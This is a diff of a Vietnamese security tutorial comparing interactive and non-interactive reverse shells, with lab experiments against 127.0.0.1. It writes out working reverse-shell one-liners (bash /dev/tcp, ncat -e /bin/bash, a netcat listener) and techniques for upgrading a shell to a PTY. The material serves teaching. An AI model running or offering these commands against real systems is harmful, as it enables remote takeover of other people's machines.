@@ -510,62 +510,48 @@ if __name__ == '__main__':
 </details>
 
 # Interactive và non-interactive shell.
-Đầu tiên, chạy reverse shell với bash `bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/9191 <&1'` rồi thử chạy `vi /tmp/hehe` từ phía server rồi thoát editor. Sau đó thử tương tự nhưng phía client chạy reverse shell bằng py đã viết.
+Thử nghiệm so sánh 2 Reverse Shells như sau:
+1. Tạo Reverse Shell sử dụng bash `bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/9191 <&1'`, rồi chạy lệnh `vi /tmp/hehe`
+2. Tạo Reverse Shell sử dụng `ncat` hoặc script python đã viết, rồi chạy `vi /tmp/haha`
 
 <details>
-<summary>Nhận xét sự khác biệt</summary>
+<summary>Nhận xét sự khác biệt giữa 2 shell từ phía server?</summary>
 
-Sau lệnh vi, phía server bị treo. Nếu thử list các process trên phía client, ví dụ `ps -aux | grep hehe`, ta thấy process vẫn đang chạy
+Sau khi chạy lệnh `vi`, Reverse Shell sử dụng bash sử dụng bình thường. Reverse Shell chạy bằng `ncat` hoặc script python bị treo. Tuy nhiên, tiến trình `vi` vẫn đang được thực thi. Kết quả khi kiểm tra các tiến trình đang chạy trên hệ thống: `ps -aux | grep hehe`:
 
 ```
 dmknght   150065  0.0  0.0   2580  1536 pts/4    S+   08:05   0:00 /bin/sh -c vi /tmp/hehe
 dmknght   150066  0.0  0.0  91704 13568 pts/4    Sl+  08:05   0:00 vi /tmp/hehe
 ```
 
-Điều này có nghĩa là vì một lý do nào đó, process vẫn đang chạy nhưng phía server không thể điều khiển được. (ngay cả khi sử dụng **Ctrl+C** để stop server, phía client vẫn tiếp tục chạy process cho đến khi bị kill.)
+Điều này có nghĩa là vì một lý do nào đó, process vẫn đang chạy nhưng phía server không thể điều khiển được. (ngay cả khi sử dụng **Ctrl+C** bên phía server để stop, process `vi` bên phía client vẫn chạy).
 </details>
 
-Từ [định nghĩa các chế độ hoạt động của bash](https://en.wikipedia.org/wiki/Bash_(Unix_shell)#Modes), ta có thể rút ra được vài điểm chính sau:
-- Interactive mode (chế độ tương tác), thực hiện lấy dữ liệu từ stdin, đưa stdout và stderr ra stdin.
-- Non-Interactive mode (chế độ không tương tác) sẽ thực hiện 1 lệnh hoặc chuỗi lệnh mà không cần người dùng tương tác.
-(TODO bổ sung phần flag -i 1. Sử dụng flag `-i` để sử dụng interactive mode)
+Sự khác biệt này là cho Reverse Shell sử dụng chế độ `-i` để chạy bash dưới chế độ [Interactive shell - Chế độ tương tác](https://www.gnu.org/software/bash/manual/bash.html#What-is-an-Interactive-Shell_003f-1).
+- Trong điều kiện thông thường, shell hoạt động theo chế độ **đọc và ghi dữ liệu bằng terminal của người dùng**.
+- Đối với những trường hợp điều khiển từ xa, giống thử nghiệm ở trên, người dùng không tương tác trực tiếp với terminal mà tương tác với shell thông qua một cổng mạng. Lúc này, shell được chạy trong chế độ [Pseudo-Interactive](https://en.wikipedia.org/wiki/Pseudoterminal). Trong chế độ `Pseudo-Interactive`, một chương trình **master** sẽ cung cấp cơ chế để điều khiển tiến trình **slave**. Phía **slave** đại diện cho một thiết bị terminal (TTY) đầy đủ chức năng theo góc nhìn của kernel. Nó cung cấp các ngữ nghĩa của terminal như line discipline, cơ chế sinh tín hiệu, job control và điều khiển I/O của terminal, và thường được gán làm controlling terminal cho các chương trình hướng terminal như shell.
 
-## Kiểm tra, chuyển đổi sang Interactive Mode
-Vậy, làm sao để có thể biết được shell hiện tại đang có interactive mode hay không? Tiến hành thử nghiệm bằng việc m ở đồng thời 3 reverse shell. Trên Linux, có thể sử dụng Tilix hoặc terminal emulator hỗ trợ chia nhiều cửa sổ.
-1. Mở reverse shell sử dụng python với server dùng lệnh `nc -nvlp 9191` và chạy script python
-2. Mở reverse shell sử dụng ncat với server `nc -nvlp 9192` và client `ncat -e /bin/bash 127.0.0.1 9192`
-3. Mở reverse shell sử dụng bash với server `nc -nvlp 9193` và client `bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/9193 <&1'`
+## Kiểm tra chế độ hiện tại của shell
+Trên hệ thống Linux, có thể có rất nhiều shell khác nhau như: Bourne Shell (SH), Bash, ZSH, Fish, ... mỗi shell cung phương pháp khác nhau để kiểm tra chế độ interactive. Ví dụ, khi [kiểm tra chế độ shell với bash](https://www.gnu.org/software/bash/manual/bash.html#Is-this-Shell-Interactive_003f-1), ta có thể kiểm tra biến `$-` có chứa ký tự `i`; biến `$PS1` không rỗng. Tiến hành thử nghiệm với một số reverse shell, kể cả interactive và non-interactive, ta có kết quả như bảng sau:
 
-Sau đó, tiến hành thử nghiệm với một số gợi ý thu thập được từ internet:
-- Xem [các flag hiện tại của shell](https://www.gnu.org/software/bash/manual/bash.html#Special-Parameters-1) bằng lệnh `echo $-`
-  <details>
-  <summary>Kết quả thử nghiệm</summary>
+| Command | `echo $-` | `echo $PS1` |
+|-|-|-|
+| `ncat -e /bin/bash 127.0.0.1 9191` | `hBs` | Rỗng |
+| `ncat -e /bin/sh 127.0.0.1 9191` | `s` | `$` |
+| `ncat -e /bin/zsh 127.0.0.1 9191` | `569Xs` | Rỗng |
+| `bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/9191 <&1'` | `himBHs` | Prompt của shell hiện tại |
+| Python script | Rỗng | `$` |
 
-  - Connect thứ nhất cho kết quả là dòng trống.
-  - Connect thứ 2 cho kết quả là `hBs` (nếu sử dụng `-e /bin/sh` thay vì `-e /bin/bash` thì kết quả là `s`)
-  - Connect thứ 3 cho kết quả là `himBHs`
+Như vậy, tạm thời có thể kết luận Non-Interactive Shell có biến `$-` không chứa chuỗi `i` và biến `$PS1` rỗng hoặc nếu sử dụng Bourne Shell thì chỉ chứa ký tự `$`.
 
-  => Như vậy, `echo $-` có thể sử dụng để phân biệt. Non-Interactive sẽ trả về 1 dòng trống.
-  </details>
-
-- Kiểm tra [shell prompt](https://wiki.linuxquestions.org/wiki/Shell_prompt) với lệnh `echo $PS1`
-  <details>
-  <summary>Kết quả thử nghiệm</summary>
-
-  - Connect thứ nhất cho kết quả là `$`
-  - Connect thứ 2 cho kết quả là `$`
-  - Connect thứ 3 cho kết quả là prompt của shell hiện tại
-
-  </details>
-
-- Thử nghiệm với `tty`
-
-
+## Nâng cấp Non-Interactive Shell lên Pseudo-Interactive Shell
 ```
 import pty
 pty.spawn("/bin/bash")
 ```
 Tuy nhiên, sử dụng command line sẽ khác: `python3 -c 'import pty;pty.spawn("/bin/bash")'`
+
+`script -qc /bin/bash /dev/null`
 
 Bài tập:
 - Viết reverse shell với python nhưng sử có interactive shell
